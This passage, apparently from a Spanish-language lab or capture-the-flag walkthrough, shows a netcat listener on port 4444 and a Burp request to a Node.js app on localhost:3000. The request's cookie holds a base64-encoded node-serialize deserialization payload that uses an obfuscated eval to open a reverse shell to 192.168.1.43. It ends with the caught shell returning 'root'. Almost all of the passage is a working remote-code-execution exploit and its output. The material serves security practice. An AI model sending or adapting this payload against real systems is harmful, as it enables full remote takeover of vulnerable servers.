❯ nc -nlvp 4444
listening on [any] 4444 ...
```

* Enviar la peticion con burpsuite para enviar la reverse shell:

```
GET / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=f0da5e2b99ae68a7234b78c7a18bd155; profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNDksNDYsNTIsNTEsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNTIsNTIsNTIsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0K
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-None-Match: W/"a-OVnSnNrTDrurUD84R2voxRGgPME"
```

* Y recibimos la reverse shell:

```bash
❯ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.1.43] from (UNKNOWN) [192.168.1.43] 33032
Connected!
whoami
root
```
